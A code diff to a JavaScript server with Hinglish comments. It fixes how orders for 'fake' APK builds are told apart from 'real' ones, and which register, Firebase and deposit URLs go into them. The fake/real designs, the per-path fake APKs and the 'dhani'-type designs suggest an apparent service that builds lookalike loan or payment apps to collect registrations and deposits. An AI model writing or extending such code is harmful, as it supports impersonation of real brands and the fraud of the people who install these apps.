@@ -54,8 +54,15 @@ function findOrderByPath(pathKey) {
     ORDER BY o.id DESC LIMIT 1
   `).get(p, p);
   if (row) {
-    const isFake = row.fake_firebase_path && String(row.fake_firebase_path).toLowerCase() === p.toLowerCase();
-    return { row, isFake };
+    const pathIsFake = row.fake_firebase_path && String(row.fake_firebase_path).toLowerCase() === p.toLowerCase();
+    // FAKE-ONLY order (build_mode='fake'): iska fake_firebase_path NULL hota hai
+    // (single path par single fake APK), isliye path-match se isFake=false aa jata
+    // tha aur server REAL design bhej deta tha — BUG. Fake-only order ko hamesha
+    // fake treat karo (design_variant='fake'; legacy rows ke liye heuristic:
+    // fake_register_url set + fake_firebase_path null = fake-only).
+    const orderIsFakeOnly = String(row.design_variant || '').toLowerCase() === 'fake'
+      || (!row.fake_firebase_path && !!row.fake_register_url);
+    return { row, isFake: !!(pathIsFake || orderIsFakeOnly) };
   }
   // Extra fake site ka path?
   const fs = db.prepare(`
@@ -127,8 +134,11 @@ function buildParams(orderRow, designRow, isFake, fakeSite) {
       domain = domain || extractDomain(registerUrl);
     }
   } else {
-    registerUrl = isFake ? orderRow.fake_register_url : orderRow.register_url;
-    firebasePath = isFake ? orderRow.fake_firebase_path : orderRow.firebase_path;
+    // Fake-only orders me fake_* columns khaali ho sakte hain (single-path order)
+    // — tab main columns use karo (unme hi fake values hoti hain). Both-mode
+    // fake ke liye fake_* set hote hain, to behavior bilkul same rehta hai.
+    registerUrl = (isFake ? orderRow.fake_register_url : null) || orderRow.register_url;
+    firebasePath = (isFake ? orderRow.fake_firebase_path : null) || orderRow.firebase_path;
     const isDhani3 = designRow.java_type === 'dhani' || designRow.java_type === 'premium' || designRow.category === 'dhani';
     const urls3 = buildUrls(registerUrl, isDhani3);
     depositUrl = urls3.deposit;
